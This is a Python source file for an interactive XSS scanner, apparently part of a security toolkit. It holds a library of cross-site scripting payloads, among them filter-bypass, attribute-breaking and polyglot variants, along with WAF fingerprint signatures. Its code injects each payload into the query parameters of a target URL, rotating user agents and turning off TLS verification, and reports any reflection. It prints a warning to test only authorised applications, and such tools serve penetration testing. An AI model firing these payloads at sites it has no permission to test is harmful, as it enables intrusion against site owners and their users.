#!/usr/bin/env python3
"""
XSS Payload Injector with WAF Detection
Advanced Cross-Site Scripting (XSS) vulnerability detection and WAF bypass.
"""

import requests
import urllib.parse
import re
import sys
import time
from pathlib import Path
from html import unescape
import urllib3

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from core import setup_logger, validate_url, ScanResult, Finding, get_session, detect_waf_basic

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Comprehensive XSS Payload Library
XSS_PAYLOADS = {
    'basic': [
        '<script>alert("XSS")</script>',
        '<script>alert(1)</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<input onfocus=alert("XSS") autofocus>',
    ],
    'filter_bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror="alert`1`">',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    ],
    'attribute_based': [
        '" onload="alert(1)',
        '\' onload=\'alert(1)',
        '"></script><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
    ],
    'event_handlers': [
        '<img src=x onerror=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<div onmouseover=alert(1)>hover</div>',
    ],
    'polyglot': [
        '\'"><img src=x onerror=alert(1)>',
        '"><svg/onload=alert(1)>',
    ]
}

# Reflection detection patterns
XSS_REFLECTION_PATTERNS = [
    r'<script[^>]*>.*?alert.*?</script>',
    r'<img[^>]*onerror\s*=',
    r'<svg[^>]*onload\s*=',
]

# WAF signatures
WAF_SIGNATURES = {
    'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare', 'CF-RAY'],
    'AWS WAF': ['x-amzn-requestid', 'awselb'],
    'ModSecurity': ['mod_security', 'NOYB'],
    'Akamai': ['akamai', 'x-akamai'],
    'Imperva': ['incapsula', 'x-iinfo'],
    'F5 BIG-IP': ['bigip', 'F5'],
}


def run():
    logger = setup_logger("xss_injector")
    logger.info("XSS Injector started")
    
    print("\033[92m" + "="*70)
    print("        XSS PAYLOAD INJECTOR - WAF Detection & Testing")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test applications you own or have permission to test!\033[0m\n")
    
    try:
        target_url = input("\033[97m[?] Enter target URL (e.g., http://site.com/page?search=test): \033[0m").strip()
        if not target_url:
            print("\033[91m[!] No URL provided.\033[0m")
            return
        
        # Validate URL
        try:
            target_url = validate_url(target_url)
        except ValueError as e:
            print(f"\033[91m[!] Invalid URL: {e}\033[0m")
            logger.error(f"Invalid URL: {e}")
            return
        
        logger.info(f"Target: {target_url}")
        
        # Check for WAF
        print(f"\n\033[96m[*] Detecting WAF...\033[0m")
        waf = detect_waf_basic(target_url)
        if waf:
            print(f"\033[91m[!] WAF DETECTED: {waf}\033[0m\n")
            logger.warning(f"WAF detected: {waf}")
        else:
            print(f"\033[92m[+] No WAF detected\033[0m\n")
            logger.info("No WAF detected")
        
        print("\033[97m[*] Testing Options:\033[0m")
        print("  [1] Quick Scan (Basic payloads)")
        print("  [2] Standard Scan (Basic + Filter bypass)")
        print("  [3] Advanced Scan (All payload types)")
        print("  [4] Custom Payload Test")
        print("  [5] WAF Bypass Payloads Only")
        
        choice = input("\n\033[95m[?] Select scan type: \033[0m").strip()
        
        # Parse URL
        parsed = urllib.parse.urlparse(target_url)
        params = urllib.parse.parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            print("\033[91m[!] No parameters found in URL.\033[0m")
            logger.error("No parameters found in URL")
            return
        
        print(f"\n\033[92m[*] Target: {base_url}\033[0m")
        print(f"\033[97m[*] Parameters: {list(params.keys())}\033[0m\n")
        
        # Create result object
        result = ScanResult(
            tool="xss_injector",
            target=target_url
        )
        
        if waf:
            result.metadata['waf_detected'] = waf
        
        vulnerabilities = []
        
        # Select payloads
        payloads_to_test = []
        
        if choice == '1':
            payloads_to_test = [(pt, p) for pt in ['basic'] for p in XSS_PAYLOADS[pt]]
        elif choice == '2':
            payloads_to_test = [(pt, p) for pt in ['basic', 'filter_bypass'] for p in XSS_PAYLOADS[pt]]
        elif choice == '3':
            payloads_to_test = [(pt, p) for pt, payloads in XSS_PAYLOADS.items() for p in payloads]
        elif choice == '4':
            custom = input("\033[97m[?] Enter custom XSS payload: \033[0m").strip()
            if custom:
                payloads_to_test = [('custom', custom)]
        elif choice == '5':
            payloads_to_test = [(pt, p) for pt in ['filter_bypass', 'polyglot'] for p in XSS_PAYLOADS[pt]]
        else:
            print("\033[91m[!] Invalid choice.\033[0m")
            logger.error("Invalid scan type choice")
            return
        
        print(f"\n\033[92m[*] Starting XSS testing with {len(payloads_to_test)} payloads...\033[0m")
        print("\033[93m[*] This may take a while...\033[0m\n")
        
        tested = 0
        total_tests = len(payloads_to_test) * len(params)
        filtered_count = 0
        
        for param_name in params.keys():
            print(f"\033[96m[*] Testing parameter: {param_name}\033[0m")
            
            for payload_type, payload in payloads_to_test:
                tested += 1
                print(f"\r\033[97m[*] Progress: {tested}/{total_tests} | Filtered: {filtered_count}\033[0m", end='', flush=True)
                
                xss_result = test_xss_payload(target_url, param_name, payload, payload_type, params, base_url, logger)
                
                if xss_result:
                    if xss_result.get('filtered'):
                        filtered_count += 1
                    else:
                        vulnerabilities.append(xss_result)
                        print(f"\n\033[91m[!] XSS VULNERABILITY FOUND!\033[0m")
                        print(f"    \033[93mParameter: {xss_result['param']}\033[0m")
                        print(f"    \033[93mType: {xss_result['type']}\033[0m")
                        print(f"    \033[93mPayload: {xss_result['payload'][:60]}...\033[0m\n")
                
                time.sleep(0.05)
        
        print("\n")
        
        # Add findings to result
        for vuln in vulnerabilities:
            result.add_finding_dict(
                title=f"XSS Vulnerability - {vuln['type']}",
                description=f"XSS found in {vuln['param']}",
                severity="HIGH",
                finding_type="xss",
                details=vuln
            )
        
        # Results
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] XSS Testing Complete\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        if vulnerabilities:
            print(f"\033[91m[!] FOUND {len(vulnerabilities)} XSS VULNERABILITIES!\033[0m\n")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\033[93m[{i}] Parameter: {vuln['param']}\033[0m")
                print(f"    Type: {vuln['type']}")
                print(f"    Evidence: {vuln['evidence']}\n")
            
            logger.warning(f"Found {len(vulnerabilities)} XSS vulnerabilities")
            
            # Save results
            save = input("\033[95m[?] Save results to JSON file? (y/n): \033[0m").strip().lower()
            if save == 'y':
                filename = f"xss_results_{int(time.time())}.json"
                try:
                    result.save_to_file(filename)
                    print(f"\033[92m[*] Results saved to {filename}\033[0m")
                    logger.info(f"Results saved to {filename}")
                except Exception as e:
                    logger.error(f"Error saving results: {e}")
                    print(f"\033[91m[!] Error saving file: {e}\033[0m")
        else:
            print(f"\033[92m[*] No XSS vulnerabilities detected.\033[0m")
            logger.info("No XSS vulnerabilities found")
        
        if filtered_count > 0:
            print(f"\033[93m[*] {filtered_count} payloads were filtered/blocked\033[0m")
        
        print(f"\n\033[97m[*] Total tests: {tested}\033[0m\n")
        
        return result
        
    except KeyboardInterrupt:
        print("\n\033[91m[!] Test interrupted by user.\033[0m")
        logger.warning("Test interrupted by user")
        return None
    
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        print(f"\033[91m[!] Unexpected error: {e}\033[0m")
        return None


def test_xss_payload(target_url, param_name, payload, payload_type, params, base_url, logger):
    """Test a single XSS payload"""
    try:
        # Prepare test parameters
        test_params = params.copy()
        test_params[param_name] = [payload]
        
        # Build request
        query_string = urllib.parse.urlencode(test_params, doseq=True)
        test_url = f"{base_url}?{query_string}"
        
        # Send request with custom session
        session = get_session(rotate_ua=True)
        response = session.get(test_url, timeout=10, verify=False, allow_redirects=True)
        
        # Check if payload was filtered
        if response.status_code in [403, 406]:
            return {
                'param': param_name,
                'payload': payload,
                'type': payload_type,
                'filtered': True,
                'evidence': f'Payload blocked (HTTP {response.status_code})'
            }
        
        # Check for reflected payload
        if payload in response.text or payload in unescape(response.text):
            # Check if it's in executable context
            for pattern in XSS_REFLECTION_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    logger.warning(f"XSS found in {param_name}")
                    return {
                        'vulnerable': True,
                        'param': param_name,
                        'payload': payload,
                        'type': payload_type,
                        'evidence': 'Payload reflected in executable context',
                        'url': test_url
                    }
            
            # Partial reflection
            logger.info(f"Possible XSS in {param_name}")
            return {
                'vulnerable': True,
                'param': param_name,
                'payload': payload,
                'type': payload_type,
                'evidence': 'Payload reflected (potential XSS)',
                'url': test_url
            }
        
        return None
        
    except requests.Timeout:
        logger.debug(f"Timeout testing {param_name}")
        return None
    except ConnectionError:
        logger.debug(f"Connection error testing {param_name}")
        return None
    except Exception as e:
        logger.debug(f"Error testing payload: {e}")
        return None


if __name__ == "__main__":
    run()
